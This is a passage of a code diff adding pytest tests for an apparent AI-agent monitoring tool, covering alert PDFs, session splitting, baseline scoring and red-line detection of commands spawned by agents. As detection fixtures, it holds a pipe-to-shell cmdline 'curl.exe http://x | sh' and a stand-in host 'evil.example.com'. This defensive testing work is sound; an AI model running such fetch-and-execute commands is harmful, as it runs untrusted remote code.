+        "created_at": "2026-03-15 10:00:00", **kw,
+    }
+
+
+def test_pdf_red_line_alert_prints_command_line():
+    cmd = "curl.exe https://example.com/data"
+    drawn = _pdf_drawn_lines_for_alerts([_alert(
+        "red_line_dangerous_command", "RED LINE: sensitive command spawned by claude_code",
+        f"claude_code spawned a potentially sensitive command: {cmd}",
+    )])
+    assert cmd in drawn
+
+
+def test_pdf_suspicious_alert_prints_command_line():
+    cmd = "ssh user@example.com"
+    drawn = _pdf_drawn_lines_for_alerts([_alert(
+        "suspicious_command", "Suspicious command spawned",
+        f"Agent spawned process (pid=5) with a suspicious command: {cmd}",
+    )])
+    assert cmd in drawn
+
+
+def test_pdf_long_command_truncated_to_200_plus_ellipsis():
+    cmd = "curl.exe " + "a" * 391  # 400 chars
+    assert len(cmd) == 400
+    drawn = _pdf_drawn_lines_for_alerts([_alert(
+        "red_line_dangerous_command", "RED LINE: sensitive command spawned by claude_code",
+        f"claude_code spawned a potentially sensitive command: {cmd}",
+    )])
+    joined = "".join(d for d in drawn if d.startswith("curl.exe") or set(d) <= {"a", "."})
+    # Wrapping may break the line at the space or mid-token, so compare
+    # with whitespace removed.
+    assert joined.replace(" ", "") == (cmd[:200] + "...").replace(" ", "")
+
+
+def test_pdf_non_command_alert_prints_no_extra_line():
+    drawn = _pdf_drawn_lines_for_alerts([_alert(
+        "unknown_destination", "RED LINE: unrecognised network destination",
+        "claude_code connected to an unrecognised destination: evil.example.com",
+    )])
+    assert not any("evil.example.com" in d for d in drawn)
+
+
+def test_pdf_contains_new_command_text_note():
+    import api.export as export_module
+    drawn = _pdf_drawn_lines_for_alerts([])
+    joined = " ".join(drawn)
+    assert "[REDACTED]" in joined
+    assert "exact command text" not in joined
+    assert export_module.REPORT_NOTES[-1].startswith("Vigil checks which programs are running")
+
+
 # ------------------------------------------ 8. writer wedge-replace failure
 #
 # Covers the gap found during the 2026-09-30 soak test: _replace_wedged_
@@ -586,7 +1384,10 @@ def test_unprefixed_routers_gated_by_frozen_flag(monkeypatch, tmp_path):
 
     try:
         not_frozen = reload_as(frozen=False)
-        client = TestClient(not_frozen.app)
+        # base_url="http://localhost" (not TestClient's "http://testserver"
+        # default) so the Host header this client sends passes main.py's
+        # localhost/origin guard middleware, same as any real request would.
+        client = TestClient(not_frozen.app, base_url="http://localhost")
         for path in ("/alerts", "/agents", "/incidents"):
             resp = client.get(path)
             assert resp.headers["content-type"].startswith("application/json"), (
@@ -595,7 +1396,7 @@ def test_unprefixed_routers_gated_by_frozen_flag(monkeypatch, tmp_path):
             )
 
         frozen = reload_as(frozen=True)
-        client = TestClient(frozen.app)
+        client = TestClient(frozen.app, base_url="http://localhost")
         for path in ("/alerts", "/agents", "/incidents"):
             resp = client.get(path)
             assert resp.status_code == 200
@@ -614,3 +1415,1173 @@ def test_unprefixed_routers_gated_by_frozen_flag(monkeypatch, tmp_path):
         # of the above, so no later test importing from main inherits the
         # frozen reload's app/FRONTEND_DIR.
         reload_as(frozen=False)
+
+
+# ---------------------------------------- 10. resumed (rediscovered) sessions
+
+@pytest.mark.asyncio
+async def test_touch_marks_resumed_sessions_and_reuses_them(test_db):
+    """resumed=True on touch() is persisted on the new row. A later touch
+    for the same agent while its session is still active reuses that same
+    session_id -- a rediscovered agent that goes on to spawn something real
+    doesn't get a second session, the original resumed=1 row absorbs it."""
+    agent_id = await _make_agent(test_db, _uniq("resumed_touch_agent"))
+    sm = SessionManager()
+
+    resumed_session_id = await sm.touch(agent_id, resumed=True)
+    cur = await test_db.execute("SELECT resumed FROM sessions WHERE id = ?", (resumed_session_id,))
+    row = await cur.fetchone()
+    assert row["resumed"] == 1
+
+    same_session_id = await sm.touch(agent_id, resumed=False)
+    assert same_session_id == resumed_session_id
+    cur = await test_db.execute("SELECT resumed FROM sessions WHERE id = ?", (resumed_session_id,))
+    row = await cur.fetchone()
+    assert row["resumed"] == 1, "the existing session's resumed flag must not be overwritten by a later touch"
+
+
+@pytest.mark.asyncio
+async def test_touch_default_is_not_resumed(test_db):
+    agent_id = await _make_agent(test_db, _uniq("fresh_touch_agent"))
+    sm = SessionManager()
+    session_id = await sm.touch(agent_id)
+    cur = await test_db.execute("SELECT resumed FROM sessions WHERE id = ?", (session_id,))
+    row = await cur.fetchone()
+    assert row["resumed"] == 0
+
+
+@pytest.mark.asyncio
+async def test_touch_splits_session_on_long_gap(test_db, monkeypatch):
+    """A gap since last_activity past SESSION_IDLE_TIMEOUT_SECONDS closes
+    the stale session (backdated to that last_activity, not now) through
+    the real scoring pipeline exactly once, then opens a genuinely new,
+    non-resumed session -- simulating the sleep-spanning-session bug
+    from the resumed-session investigation."""
+    from core.baseline import Baseline
+
+    agent_id = await _make_agent(test_db, _uniq("gapsplit_agent"))
+    sm = SessionManager()
+
+    call_count = {"n": 0}
+    original_update = Baseline.update_from_session
+
+    async def counting_update(self, session_id):
+        call_count["n"] += 1
+        return await original_update(self, session_id)
+
+    monkeypatch.setattr(Baseline, "update_from_session", counting_update)
+
+    old_session_id = await sm.touch(agent_id)
+    stale_time = datetime.now(timezone.utc) - timedelta(hours=10)
+    sm._active[agent_id]["last_activity"] = stale_time
+
+    cur = await test_db.execute("SELECT session_count FROM agents WHERE id = ?", (agent_id,))
+    count_before = (await cur.fetchone())["session_count"]
+
+    new_session_id = await sm.touch(agent_id)
+    assert new_session_id != old_session_id
+
+    cur = await test_db.execute("SELECT ended_at FROM sessions WHERE id = ?", (old_session_id,))
+    row = await cur.fetchone()
+    assert row["ended_at"] == stale_time.strftime("%Y-%m-%d %H:%M:%S"), "ended_at must be backdated, not CURRENT_TIMESTAMP"
+
+    cur = await test_db.execute("SELECT resumed FROM sessions WHERE id = ?", (new_session_id,))
+    assert (await cur.fetchone())["resumed"] == 0, "a gap split must never mark the new session resumed"
+
+    cur = await test_db.execute("SELECT session_count FROM agents WHERE id = ?", (agent_id,))
+    count_after = (await cur.fetchone())["session_count"]
+    assert count_after == count_before + 1
+
+    assert call_count["n"] == 1, "baseline scoring must run exactly once for the stale session"
+
+
+@pytest.mark.asyncio
+async def test_touch_split_scoring_failure_does_not_block_new_session(test_db, monkeypatch, caplog):
+    """If closing the stale session raises, the failure is logged but a
+    new session must still be opened -- a scoring failure must never
+    block new-session creation."""
+    agent_id = await _make_agent(test_db, _uniq("gapsplit_fail_agent"))
+    sm = SessionManager()
+
+    old_session_id = await sm.touch(agent_id)
+    sm._active[agent_id]["last_activity"] = datetime.now(timezone.utc) - timedelta(hours=10)
+
+    async def boom(self, db, session_id, agent_id):
+        raise RuntimeError("roll-up exploded")
+
+    monkeypatch.setattr(SessionManager, "_roll_up_session_stats", boom)
+
+    new_session_id = await sm.touch(agent_id)
+    assert new_session_id != old_session_id
+
+    cur = await test_db.execute("SELECT id FROM sessions WHERE id = ?", (new_session_id,))
+    assert await cur.fetchone() is not None, "the new session must exist even though closing the old one failed"
+    assert "closing stale session" in caplog.text
+
+
+@pytest.mark.asyncio
+async def test_touch_within_timeout_does_not_split(test_db):
+    agent_id = await _make_agent(test_db, _uniq("nosplit_agent"))
+    sm = SessionManager()
+    session_id = await sm.touch(agent_id)
+    sm._active[agent_id]["last_activity"] = datetime.now(timezone.utc) - timedelta(seconds=100)
+
+    same_session_id = await sm.touch(agent_id)
+    assert same_session_id == session_id
+
+    cur = await test_db.execute("SELECT ended_at FROM sessions WHERE id = ?", (session_id,))
+    assert (await cur.fetchone())["ended_at"] is None, "a normal touch within the timeout must not close the session"
+
+
+@pytest.mark.asyncio
+async def test_touch_concurrent_gap_split_creates_exactly_one_new_session(test_db, monkeypatch):
+    """8 concurrent touch() calls on the same stale agent must not race
+    into 8 duplicate replacement sessions: whichever call acquires the
+    per-agent lock first does the pop-and-create, every other call finds
+    that new session already registered and just returns it."""
+    from core.baseline import Baseline
+
+    agent_id = await _make_agent(test_db, _uniq("concurrent_gapsplit_agent"))
+    sm = SessionManager()
+
+    call_count = {"n": 0}
+    original_update = Baseline.update_from_session
+
+    async def counting_update(self, session_id):
+        call_count["n"] += 1
+        return await original_update(self, session_id)
+
+    monkeypatch.setattr(Baseline, "update_from_session", counting_update)
+
+    old_session_id = await sm.touch(agent_id)
+    stale_time = datetime.now(timezone.utc) - timedelta(hours=10)
+    sm._active[agent_id]["last_activity"] = stale_time
+
+    cur = await test_db.execute("SELECT session_count FROM agents WHERE id = ?", (agent_id,))
+    count_before = (await cur.fetchone())["session_count"]
+
+    results = await asyncio.gather(*[sm.touch(agent_id) for _ in range(8)])
+
+    assert len(set(results)) == 1, "all 8 concurrent calls must return the same new session id"
+    new_session_id = results[0]
+    assert new_session_id != old_session_id
+
+    cur = await test_db.execute(
+        "SELECT COUNT(*) c FROM sessions WHERE agent_id = ? AND id != ?", (agent_id, old_session_id),
+    )
+    assert (await cur.fetchone())["c"] == 1, "exactly one new session row, not 8"
+
+    cur = await test_db.execute("SELECT ended_at FROM sessions WHERE id = ?", (old_session_id,))
+    row = await cur.fetchone()
+    assert row["ended_at"] == stale_time.strftime("%Y-%m-%d %H:%M:%S")
+
+    cur = await test_db.execute("SELECT session_count FROM agents WHERE id = ?", (agent_id,))
+    count_after = (await cur.fetchone())["session_count"]
+    assert count_after == count_before + 1, "session_count must increment exactly once, not 8 times"
+
+    assert set(sm._active.keys()) == {agent_id}
+    assert sm._active[agent_id]["session_id"] == new_session_id
+    assert call_count["n"] == 1, "the stale session must be scored exactly once"
+
+
+@pytest.mark.asyncio
+async def test_close_idle_sessions_concurrent_with_touch_gap_split(test_db, monkeypatch):
+    """close_idle_sessions racing against touch()'s own gap-split for the
+    same stale agent must not raise, must not close the live new
+    session, and must close the stale one exactly once regardless of
+    which path actually wins the race."""
+    from core.baseline import Baseline
+
+    agent_id = await _make_agent(test_db, _uniq("race_closeidle_agent"))
+    sm = SessionManager()
+
+    call_count = {"n": 0}
+    original_update = Baseline.update_from_session
+
+    async def counting_update(self, session_id):
+        call_count["n"] += 1
+        return await original_update(self, session_id)
+
+    monkeypatch.setattr(Baseline, "update_from_session", counting_update)
+
+    old_session_id = await sm.touch(agent_id)
+    sm._active[agent_id]["last_activity"] = datetime.now(timezone.utc) - timedelta(hours=10)
+
+    baseline = Baseline()
+    new_session_id, _closed = await asyncio.gather(
+        sm.touch(agent_id),
+        sm.close_idle_sessions(baseline),
+    )
+
+    assert new_session_id != old_session_id
+
+    cur = await test_db.execute("SELECT ended_at FROM sessions WHERE id = ?", (old_session_id,))
+    assert (await cur.fetchone())["ended_at"] is not None, "the stale session must be closed by one path or the other"
+
+    cur = await test_db.execute("SELECT ended_at FROM sessions WHERE id = ?", (new_session_id,))
+    assert (await cur.fetchone())["ended_at"] is None, "the live new session must never be closed"
+
+    assert sm._active[agent_id]["session_id"] == new_session_id
+    assert call_count["n"] == 1, "the stale session must be scored exactly once, not by both paths"
+
+
+@pytest.mark.asyncio
+async def test_touch_gap_split_close_failure_still_registers_new_session(test_db, monkeypatch):
+    agent_id = await _make_agent(test_db, _uniq("gapsplit_raise_agent"))
+    sm = SessionManager()
+
+    old_session_id = await sm.touch(agent_id)
+    sm._active[agent_id]["last_activity"] = datetime.now(timezone.utc) - timedelta(hours=10)
+
+    async def boom(self, db, baseline, session_id, agent_id, ended_at=None):
+        raise RuntimeError("close exploded")
+
+    monkeypatch.setattr(SessionManager, "_close_session", boom)
+
+    new_session_id = await sm.touch(agent_id)
+    assert new_session_id != old_session_id
+    assert sm._active[agent_id]["session_id"] == new_session_id
+
+    cur = await test_db.execute("SELECT id FROM sessions WHERE id = ?", (new_session_id,))
+    assert await cur.fetchone() is not None
+
+
+@pytest.mark.asyncio
+async def test_touch_gap_split_close_does_not_swallow_cancelled_error(test_db, monkeypatch):
+    agent_id = await _make_agent(test_db, _uniq("gapsplit_cancel_agent"))
+    sm = SessionManager()
+
+    await sm.touch(agent_id)
+    sm._active[agent_id]["last_activity"] = datetime.now(timezone.utc) - timedelta(hours=10)
+
+    async def cancel_boom(self, db, baseline, session_id, agent_id, ended_at=None):
+        raise asyncio.CancelledError()
+
+    monkeypatch.setattr(SessionManager, "_close_session", cancel_boom)
+
+    with pytest.raises(asyncio.CancelledError):
+        await sm.touch(agent_id)
+
+
+@pytest.mark.asyncio
+async def test_process_watcher_marks_first_poll_sessions_resumed(test_db):
+    """ProcessWatcher's very first poll after construction (a restart)
+    treats every already-running agent-matching PID as "new" since
+    self._known_pids starts empty -- those sessions are opened with
+    resumed=True. A PID that genuinely spawns later, after the first real
+    snapshot is in hand, is not."""
+    from watchers.process_watcher import ProcessWatcher
+
+    class _FakeSessions:
+        def __init__(self):
+            self.calls: list[tuple[int, bool]] = []
+
+        async def touch(self, agent_id, resumed=False):
+            self.calls.append((agent_id, resumed))
+            return _uniq("fake-session")
+
+    class _FakeAttributor:
+        def __init__(self, db):
+            self._db = db
+            self.sessions = _FakeSessions()
+            self._name_by_pid: dict[int, str] = {}
+            self._agent_ids: dict[str, int] = {}
+
+        def get_named_agent_for_pid(self, pid, pid_snapshot=None):
+            return self._name_by_pid.get(pid)
+
+        def get_behaviour_score_for_pid(self, pid):
+            return None
+
+        async def get_or_create_agent(self, name, pid=None, confidence=None):
+            if name not in self._agent_ids:
+                self._agent_ids[name] = await _make_agent(self._db, _uniq(name))
+            return self._agent_ids[name]
+
+    attributor = _FakeAttributor(test_db)
+    attributor._name_by_pid[111] = "claude_code"
+    watcher = ProcessWatcher(attributor, aggregator=None)
+    watcher._pid_snapshot = {111: {"name": "claude.exe", "ppid": 1, "status": "running"}}
+
+    # First poll: current_pids == {111}, self._known_pids starts empty --
+    # exactly the "already running when Vigil started" case.
+    await watcher._poll_write_body({111})
+    assert watcher._is_first_poll is False
+    agent_id = attributor._agent_ids["claude_code"]
+    assert attributor.sessions.calls == [(agent_id, True)]
+
+    # A later poll: 111 is no longer new, but a genuinely new pid 222 for
+    # the same agent must be resumed=False.
+    attributor._name_by_pid[222] = "claude_code"
+    watcher._pid_snapshot[222] = {"name": "claude.exe", "ppid": 111, "status": "running"}
+    await watcher._poll_write_body({111, 222})
+    assert attributor.sessions.calls[-1] == (agent_id, False)
+
+
+class _FakeSessionsForCmdlineTest:
+    async def touch(self, agent_id, resumed=False):
+        return _uniq("fake-session")
+
+
+class _FakeAttributorForCmdlineTest:
+    """Attributes a single configured pid via parent-chain (never by its
+    own name), matching the real-world case of cmd.exe/curl.exe/sh.exe
+    spawned under a tracked agent -- these never appear in
+    AGENT_PROCESS_NAMES, so get_named_agent_for_pid's real parent-chain
+    walk would resolve them the same way this fake does directly."""
+
+    def __init__(self, db, attributed_pid, agent_name="claude_code"):
+        self._db = db
+        self.sessions = _FakeSessionsForCmdlineTest()
+        self._agent_ids: dict[str, int] = {}
+        self._attributed_pid = attributed_pid
+        self._agent_name = agent_name
+
+    def get_named_agent_for_pid(self, pid, pid_snapshot=None):
+        return self._agent_name if pid == self._attributed_pid else None
+
+    def get_behaviour_score_for_pid(self, pid):
+        return None
+
+    async def get_or_create_agent(self, name, pid=None, confidence=None):
+        if name not in self._agent_ids:
+            self._agent_ids[name] = await _make_agent(self._db, _uniq(name))
+        return self._agent_ids[name]
+
+
+@pytest.mark.asyncio
+async def test_process_watcher_fetches_cmdline_for_parent_chain_attributed_pid(test_db):
+    """A process attributed only via parent-chain (its own name isn't in
+    AGENT_PROCESS_NAMES) must still get its cmdline fetched this cycle
+    and stored in the proc_spawn event's detail.args -- see
+    _snapshot_pids's widened fetch for newly-observed PIDs."""
+    from watchers.process_watcher import ProcessWatcher
+
+    attributor = _FakeAttributorForCmdlineTest(test_db, attributed_pid=200)
+    watcher = ProcessWatcher(attributor, aggregator=None)
+
+    async def fake_run_process_scan(agent_pids=None):
+        if agent_pids is None:
+            return {
+                "processes": [{"pid": 200, "name": "cmd.exe", "ppid": 100, "status": "running"}],
+                "envs": {}, "cmdlines": {},
+            }
+        assert 200 in agent_pids, "the new, non-name-matched pid must be in the cmdline fetch list"
+        return {
+            "processes": [], "envs": {},
+            "cmdlines": {200: {"args": ["cmd.exe", "/c", "echo", "hi"], "exe_path": "C:\\Windows\\System32\\cmd.exe"}},
+        }
+
+    watcher._run_process_scan = fake_run_process_scan
+
+    current_pids = await watcher._snapshot_pids()
+    assert current_pids == {200}
+    await watcher._poll_write_body(current_pids)
+
+    cur = await test_db.execute(
+        "SELECT detail FROM events WHERE event_type = 'proc_spawn' AND detail LIKE '%cmd.exe%' ORDER BY id DESC LIMIT 1"
+    )
+    row = await cur.fetchone()
+    assert row is not None
+    detail = json.loads(row["detail"])
+    assert detail["args"] == ["cmd.exe", "/c", "echo", "hi"]
+
+
+@pytest.mark.asyncio
+async def test_process_watcher_dangerous_command_in_fetched_cmdline_fires_alert(test_db):
+    """A dangerous command's cmdline, once fetched via the widened
+    parent-chain fetch, must reach check_dangerous_command and fire a
+    red-line alert -- confirming the fetch is actually wired into
+    detection, not just stored inertly in the event."""
+    from watchers.process_watcher import ProcessWatcher
+
+    attributor = _FakeAttributorForCmdlineTest(test_db, attributed_pid=300)
+    watcher = ProcessWatcher(attributor, aggregator=None)
+
+    async def fake_run_process_scan(agent_pids=None):
+        if agent_pids is None:
+            return {
+                "processes": [{"pid": 300, "name": "curl.exe", "ppid": 100, "status": "running"}],
+                "envs": {}, "cmdlines": {},
+            }
+        assert 300 in agent_pids
+        return {
+            "processes": [], "envs": {},
+            "cmdlines": {300: {"args": ["curl.exe", "http://x", "|", "sh"], "exe_path": "C:\\curl.exe"}},
+        }
+
+    watcher._run_process_scan = fake_run_process_scan
+
+    current_pids = await watcher._snapshot_pids()
+    await watcher._poll_write_body(current_pids)
+
+    agent_id = attributor._agent_ids["claude_code"]
+    cur = await test_db.execute(
+        "SELECT title, description FROM alerts WHERE agent_id = ? AND title LIKE '%sensitive command%'",
+        (agent_id,),
+    )
+    row = await cur.fetchone()
+    assert row is not None, "check_dangerous_command must have fired for the curl.exe cmdline"
+    assert "curl.exe http://x | sh" in row["description"]
+
+
+async def _spawn_and_get_alert_titles(test_db, pid, name, args, exe_path, monkeypatch=None):
+    from watchers.process_watcher import ProcessWatcher
+
+    attributor = _FakeAttributorForCmdlineTest(test_db, attributed_pid=pid)
+    watcher = ProcessWatcher(attributor, aggregator=None)
+
+    async def fake_run_process_scan(agent_pids=None):
+        if agent_pids is None:
+            return {
+                "processes": [{"pid": pid, "name": name, "ppid": 100, "status": "running"}],
+                "envs": {}, "cmdlines": {},
+            }
+        return {"processes": [], "envs": {}, "cmdlines": {pid: {"args": args, "exe_path": exe_path}}}
+
+    watcher._run_process_scan = fake_run_process_scan
+    current_pids = await watcher._snapshot_pids()
+    await watcher._poll_write_body(current_pids)
+
+    agent_id = attributor._agent_ids["claude_code"]
+    cur = await test_db.execute("SELECT title FROM alerts WHERE agent_id = ?", (agent_id,))
+    return [r["title"] for r in await cur.fetchall()]
+
+
+@pytest.mark.asyncio
+async def test_curl_process_produces_exactly_one_alert(test_db):
+    """curl is both red-lined and _is_suspicious; only the red-line alert
+    may fire for the pid, not also "Suspicious command spawned"."""
+    titles = await _spawn_and_get_alert_titles(
+        test_db, 500, "curl.exe", ["curl.exe", "https://example.com"], "C:\\curl.exe",
+    )
+    assert len(titles) == 1, titles
+    assert "sensitive command" in titles[0]
+
+
+@pytest.mark.asyncio
+async def test_suspicious_but_not_red_lined_still_fires_generic_alert(test_db, monkeypatch):
+    """The lists nearly overlap, so no real command is suspicious yet
+    un-red-lined; stub check_dangerous_command to return False to prove the
+    generic fallback alert still fires."""
+    from core.red_lines import RedLines
+
+    async def no_red_line(self, *args, **kwargs):
+        return False
+
+    monkeypatch.setattr(RedLines, "check_dangerous_command", no_red_line)
+    titles = await _spawn_and_get_alert_titles(
+        test_db, 600, "curl.exe", ["curl.exe", "https://example.com"], "C:\\curl.exe",
+    )
+    assert titles == ["Suspicious command spawned"]
+
+
+@pytest.mark.asyncio
+async def test_process_watcher_cmdline_fetch_failure_leaves_args_empty(test_db):
+    """If the cmdline fetch for a newly-observed pid comes back with no
+    entry at all (AccessDenied/NoSuchProcess, exactly like the scan
+    worker's own except-clause for an unreachable process), the event
+    must still be written with an empty args list, and the poll must
+    not raise."""
+    from watchers.process_watcher import ProcessWatcher
+
+    attributor = _FakeAttributorForCmdlineTest(test_db, attributed_pid=400)
+    watcher = ProcessWatcher(attributor, aggregator=None)
+
+    async def fake_run_process_scan(agent_pids=None):
+        if agent_pids is None:
+            return {
+                "processes": [{"pid": 400, "name": "sh.exe", "ppid": 100, "status": "running"}],
+                "envs": {}, "cmdlines": {},
+            }
+        # No entry for pid 400 at all -- the orchestrator's own code
+        # (`if pid in fresh_cmdlines: ...`) must tolerate this silently.
+        return {"processes": [], "envs": {}, "cmdlines": {}}
+
+    watcher._run_process_scan = fake_run_process_scan
+
+    current_pids = await watcher._snapshot_pids()
+    await watcher._poll_write_body(current_pids)  # must not raise
+
+    cur = await test_db.execute(
+        "SELECT detail FROM events WHERE event_type = 'proc_spawn' AND detail LIKE '%sh.exe%' ORDER BY id DESC LIMIT 1"
+    )
+    row = await cur.fetchone()
+    assert row is not None
+    detail = json.loads(row["detail"])
+    assert detail["args"] == []
+
+
+@pytest.mark.asyncio
+async def test_baseline_skips_resumed_and_zero_activity_sessions(test_db):
+    """update_from_session() must not fold a resumed=1 session's stats
+    (its duration/timing reflects Vigil's restart, not the agent) or a
+    genuinely empty session's into the running baseline -- only a session
+    with real activity and resumed=0 should move sample_count."""
+    agent_id = await _make_agent(test_db, _uniq("baseline_resumed_agent"))
+    baseline = Baseline()
+
+    resumed_session_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at, file_reads, file_writes, "
+        "net_egress_bytes, proc_spawns, resumed) VALUES "
+        "(?, ?, '2026-01-01 10:00:00', '2026-01-01 10:05:00', 500, 500, 0, 10, 1)",
+        (resumed_session_id, agent_id),
+    )
+    empty_session_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at, file_reads, file_writes, "
+        "net_egress_bytes, proc_spawns, resumed) VALUES "
+        "(?, ?, '2026-01-01 11:00:00', '2026-01-01 11:00:00', 0, 0, 0, 0, 0)",
+        (empty_session_id, agent_id),
+    )
+    await test_db.commit()
+
+    await baseline.update_from_session(resumed_session_id)
+    await baseline.update_from_session(empty_session_id)
+
+    cur = await test_db.execute(
+        "SELECT sample_count FROM baseline WHERE agent_id = ? AND metric_name = 'file_read_count' AND metric_scope IS NULL",
+        (agent_id,),
+    )
+    assert await cur.fetchone() is None, "neither the resumed nor the empty session should have been folded in"
+
+    real_session_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at, file_reads, file_writes, "
+        "net_egress_bytes, proc_spawns, resumed) VALUES "
+        "(?, ?, '2026-01-01 12:00:00', '2026-01-01 12:10:00', 5, 5, 0, 2, 0)",
+        (real_session_id, agent_id),
+    )
+    await test_db.commit()
+    await baseline.update_from_session(real_session_id)
+
+    cur = await test_db.execute(
+        "SELECT sample_count FROM baseline WHERE agent_id = ? AND metric_name = 'file_read_count' AND metric_scope IS NULL",
+        (agent_id,),
+    )
+    row = await cur.fetchone()
+    assert row is not None and row["sample_count"] == 1
+
+
+@pytest.mark.asyncio
+async def test_layer2b_history_skips_resumed_and_zero_activity_sessions(test_db):
+    """get_session_history() must exclude resumed=1 rows and sessions with
+    no file/network/duration activity at all, so the rolling-window
+    median it feeds mad_score() isn't pulled toward zero/duplicate-
+    restart artifacts that never reflect real agent behaviour."""
+    from core.layer2b import get_session_history
+
+    agent_id = await _make_agent(test_db, _uniq("layer2b_resumed_agent"))
+
+    async def _insert_session(started, ended, resumed, file_events=0):
+        session_id = _uniq("sess")
+        await test_db.execute(
+            "INSERT INTO sessions (id, agent_id, started_at, ended_at, resumed) VALUES (?, ?, ?, ?, ?)",
+            (session_id, agent_id, started, ended, 1 if resumed else 0),
+        )
+        for _ in range(file_events):
+            await test_db.execute(
+                "INSERT INTO events (agent_id, session_id, event_type, path, created_at) "
+                "VALUES (?, ?, 'file_write', 'x', ?)",
+                (agent_id, session_id, started),
+            )
+        await test_db.commit()
+        return session_id
+
+    await _insert_session("2026-01-01 09:00:00", "2026-01-01 09:00:00", resumed=True)
+    await _insert_session("2026-01-01 09:05:00", "2026-01-01 09:05:00", resumed=True)
+    await _insert_session("2026-01-01 09:10:00", "2026-01-01 09:10:00", resumed=False)  # empty, resumed=0
+    await _insert_session("2026-01-01 10:00:00", "2026-01-01 10:10:00", resumed=False, file_events=5)
+    await _insert_session("2026-01-01 11:00:00", "2026-01-01 11:10:00", resumed=False, file_events=8)
+    await _insert_session("2026-01-01 12:00:00", "2026-01-01 12:10:00", resumed=False, file_events=3)
+
+    # Only 3 real sessions so far: below the 5-session minimum, so no history.
+    assert await get_session_history(agent_id, _uniq("current-session"), test_db) == []
+
+    await _insert_session("2026-01-01 13:00:00", "2026-01-01 13:10:00", resumed=False, file_events=6)
+    await _insert_session("2026-01-01 14:00:00", "2026-01-01 14:10:00", resumed=False, file_events=9)
+
+    history = await get_session_history(agent_id, _uniq("current-session"), test_db)
+
+    assert len(history) == 5
+    assert {h["file_writes"] for h in history} == {5, 8, 3, 6, 9}
+
+
+async def _insert_layer2b_session(db, agent_id, started, ended, file_events=0, resumed=False):
+    """One aggregated file_write row carrying file_events writes (Layer 2b
+    counts file_count, and its floors are in the hundreds)."""
+    session_id = _uniq("sess")
+    await db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at, resumed) VALUES (?, ?, ?, ?, ?)",
+        (session_id, agent_id, started, ended, 1 if resumed else 0),
+    )
+    if file_events:
+        await db.execute(
+            "INSERT INTO events (agent_id, session_id, event_type, path, file_count, created_at) "
+            "VALUES (?, ?, 'file_write', 'C:/work/project', ?, ?)",
+            (agent_id, session_id, file_events, started),
+        )
+    await db.commit()
+    return session_id
+
+
+_LAYER2B_HISTORY = (400, 410, 420, 430, 440)
+
+
+async def _make_layer2b_history(db, agent_id):
+    for i, count in enumerate(_LAYER2B_HISTORY):
+        await _insert_layer2b_session(
+            db, agent_id, f"2026-01-01 0{i}:00:00", f"2026-01-01 0{i}:10:00", file_events=count,
+        )
+
+
+@pytest.mark.asyncio
+async def test_layer2b_upward_only_low_value_no_alert(test_db):
+    """A current value at or below the history's median must never fire
+    a volume alert, however far it deviates -- mad_score is a two-sided
+    magnitude, but this alert only ever means "more than usual"."""
+    agent_id = await _make_agent(test_db, _uniq("layer2b_lowvalue_agent"))
+    await _make_layer2b_history(test_db, agent_id)
+
+    current_session_id = await _insert_layer2b_session(
+        test_db, agent_id, "2026-01-01 20:00:00", "2026-01-01 20:10:00", file_events=100,
+    )
+
+    alert_ids = await score_session_2b(current_session_id, agent_id, "claude_code", test_db)
+    assert alert_ids == [], "a value well below the median must not fire, however large the raw deviation"
+
+
+@pytest.mark.asyncio
+async def test_layer2b_skips_resumed_current_session(test_db):
+    """A resumed=1 session's own metrics are partial (see
+    core/sessions.py::touch), so it must never be scored against
+    history by layer2b, even with real history and an extreme value --
+    consistent with core/baseline.py skipping resumed sessions too."""
+    agent_id = await _make_agent(test_db, _uniq("layer2b_resumed_current_agent"))
+    await _make_layer2b_history(test_db, agent_id)
+
+    current_session_id = await _insert_layer2b_session(
+        test_db, agent_id, "2026-01-01 20:00:00", "2026-01-01 20:10:00", file_events=5000, resumed=True,
+    )
+
+    alert_ids = await score_session_2b(current_session_id, agent_id, "claude_code", test_db)
+    assert alert_ids == [], "a resumed=1 current session must never be scored by layer2b"
+
+
+@pytest.mark.asyncio
+async def test_layer2b_normal_high_deviation_still_alerts(test_db):
+    """The floors and the 3x rule must not suppress a real spike -- a value
+    far above the median, the floor and 3x the baseline still fires one
+    merged "Unusual activity volume" alert, capped at MEDIUM because
+    nothing corroborates it."""
+    layer2b._alerter._last_fired.clear()
+    agent_id = await _make_agent(test_db, _uniq("layer2b_highvalue_agent"))
+    await _make_layer2b_history(test_db, agent_id)
+
+    current_session_id = await _insert_layer2b_session(
+        test_db, agent_id, "2026-01-01 20:00:00", "2026-01-01 20:10:00", file_events=2000,
+    )
+
+    alert_ids = await score_session_2b(current_session_id, agent_id, "claude_code", test_db)
+    assert len(alert_ids) == 1
+
+    cur = await test_db.execute("SELECT title, severity, description FROM alerts WHERE id = ?", (alert_ids[0],))
+    row = await cur.fetchone()
+    assert row["title"] == "Unusual activity volume"
+    assert row["severity"] == "medium"
+    assert "file writes: 2000" in row["description"]
+
+
+@pytest.mark.asyncio
+async def test_resumed_column_migration_is_idempotent():
+    """A DB created before `resumed` existed (the exact pre-this-task
+    sessions schema) gets the column added by _migrate(), and running
+    _migrate() again on the same connection must not raise or duplicate
+    the column -- the same idempotency every other ALTER TABLE in
+    _migrate() already relies on."""
+    import tempfile
+    from pathlib import Path
+
+    import aiosqlite
+
+    tmp_dir = tempfile.mkdtemp(prefix="vlaw_migration_test_")
+    db_path = Path(tmp_dir) / "legacy.db"
+
+    conn = await aiosqlite.connect(db_path)
+    conn.row_factory = aiosqlite.Row
+    try:
+        schema_sql = database.SCHEMA_PATH.read_text()
+        await conn.executescript(schema_sql)
+        # Replace the (already-migrated) sessions table with the exact
+        # pre-this-task column set, reproducing what a real live DB
+        # looks like before this change ships.
+        await conn.execute("DROP TABLE sessions")
+        await conn.execute(
+            """
+            CREATE TABLE sessions (
+                id TEXT PRIMARY KEY,
+                agent_id INTEGER REFERENCES agents(id),
+                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                ended_at TIMESTAMP,
+                file_reads INTEGER DEFAULT 0,
+                file_writes INTEGER DEFAULT 0,
+                net_egress_bytes INTEGER DEFAULT 0,
+                proc_spawns INTEGER DEFAULT 0,
+                cred_accesses INTEGER DEFAULT 0,
